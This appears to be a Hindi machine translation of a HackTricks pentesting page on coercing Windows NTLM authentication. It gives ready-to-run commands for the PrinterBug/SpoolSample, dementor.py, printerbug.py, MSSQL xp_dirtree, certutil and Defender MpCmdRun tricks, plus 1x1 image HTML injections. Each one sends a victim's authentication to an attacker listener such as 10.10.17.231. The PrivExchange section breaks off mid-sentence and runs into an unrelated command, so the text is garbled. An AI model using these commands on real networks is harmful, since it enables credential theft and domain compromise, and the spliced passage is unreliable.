# एनटीएलएम विशेषाधिकारिक प्रमाणीकरण को बलपूर्वक करें

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापित करना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटीएस**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक पीएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मेरा** **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **पालन** करें।
* **हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) एक **संग्रह** है **दूरस्थ प्रमाणीकरण ट्रिगर** का जो MIDL कंपाइलर का उपयोग करके C# में कोड किया गया है ताकि 3 वीं पक्षीय निर्भरताओं से बचा जा सके।

## स्पूलर सेवा दुरुपयोग

यदि _**प्रिंट स्पूलर**_ सेवा **सक्रिय** है, तो आप कुछ पहले से जाने जाने वाले एडी क्रेडेंशियल का उपयोग करके डोमेन कंट्रोलर के प्रिंट सर्वर से नए प्रिंट जॉब्स पर अपडेट करने का अनुरोध कर सकते हैं और बस इसे कह सकते हैं कि नोटिफिकेशन किसी सिस्टम पर भेजें।\
ध्यान दें कि प्रिंटर जब किसी अनिश्चित सिस्टम पर नोटिफिकेशन भेजते हैं, तो उस सिस्टम के खिलाफ प्रमाणीकरण की आवश्यकता होती है। इसलिए, एक हमलावर _**प्रिंट स्पूलर**_ सेवा को किसी अनिश्चित सिस्टम के खिलाफ प्रमाणीकरण करने के लिए बना सकता है, और सेवा इस प्रमाणीकरण में कंप्यूटर खाता का उपयोग करेगी।

### डोमेन पर विंडोज सर्वर्स खोजना

PowerShell का उपयोग करके, विंडोज बॉक्स की सूची प्राप्त करें। सर्वर आम तौर पर प्राथमिकता होते हैं, इसलिए हमें वहाँ ध्यान केंद्रित करना चाहिए:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### स्पूलर सेवाएं सुन रही हैं

थोड़ी बदली हुई @mysmartlogin's (विन्सेंट ले टूक्स) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) का उपयोग करके देखें कि क्या स्पूलर सेवा सुन रही है:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
आप लिनक्स पर rpcdump.py का उपयोग कर सकते हैं और MS-RPRN Protocol के लिए खोज कर सकते हैं।
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### एक सेवा से किसी भी होस्ट के खिलाफ प्रमाणीकरण करने के लिए सेवा से पूछें

आप यहाँ से [**SpoolSample को कंपाइल कर सकते हैं**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**।**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
या [**3xocyte का dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें अगर आप Linux पर हैं।
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### स्वतंत्र अनुमोदन के साथ मिलाकर

यदि किसी हमलावर ने पहले से ही [स्वतंत्र अनुमोदन](unconstrained-delegation.md) के साथ किसी कंप्यूटर को कंप्रमाइज कर लिया है, तो हमलावर **प्रिंटर को इस कंप्यूटर के खिलाफ प्रमाणीकरण करने** के लिए सक्षम हो सकता है। स्वतंत्र अनुमोदन के कारण, **प्रिंटर के कंप्यूटर खाते का TGT** स्वतंत्र अनुमोदन वाले कंप्यूटर की मेमोरी में **सहेजा जाएगा**। क्योंकि हमलावर ने पहले से ही इस होस्ट को कंप्रमाइज कर लिया है, वह **इस टिकट को पुनः प्राप्त** कर सकेगा और इसका दुरुपयोग कर सकेगा ([टिकट पास करें](pass-the-ticket.md))।

## RCP बल प्रमाणीकरण

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` हमला एक दोष का परिणाम है जो **एक्सचेंज सर्वर `PushSubscription` सुविधा** में पाया गया है। यह सुविधा एक्सचेंज सर्वर को किसी भी डोमेन उपयोगकर्ता द्वारा बाधित करने की अनुमति देती है ताकि वह किसी भी क्लाइंट द्वारा प्रदान किए गए होस्ट पर HTTP के माध्यम से प्रमाणीकरण कर सके।

डिफ़ॉल्ट रूप से, **एक्सचेंज सेवा SYSTEM के रूप में चलती है** और इसे अत्यधिक अधिकार (विशेष रूप से, **डोमेन पूर्व-2019 संचयी अपड
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
या इस दूसरी तकनीक का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Certutil.exe lolbin (Microsoft-signed binary) का उपयोग करके NTLM प्रमाणीकरण को बलपूर्वक करना संभव है:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML इन्जेक्शन

### ईमेल के माध्यम से

यदि आपको मशीन में लॉग इन करने वाले उपयोगकर्ता का **ईमेल पता** पता है जिसे आप कंप्रोमाइज़ करना चाहते हैं, तो आप उसे एक **1x1 छवि के साथ ईमेल** भेज सकते हैं जैसे कि
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

यदि आप किसी कंप्यूटर पर MitM हमला कर सकते हैं और उसके द्वारा एक पृष्ठ में HTML इंजेक्ट कर सकते हैं जिसे वह देखेगा, तो आप पृष्ठ में निम्नलिखित तरह की एक छवि इंजेक्ट करने की कोशिश कर सकते हैं:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 क्रैकिंग

यदि आप [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack) कैप्चर कर सकते हैं।\
_ध्यान दें कि NTLMv1 को क्रैक करने के लिए आपको रिस्पॉंडर चैलेंज को "1122334455667788" पर सेट करना होगा_
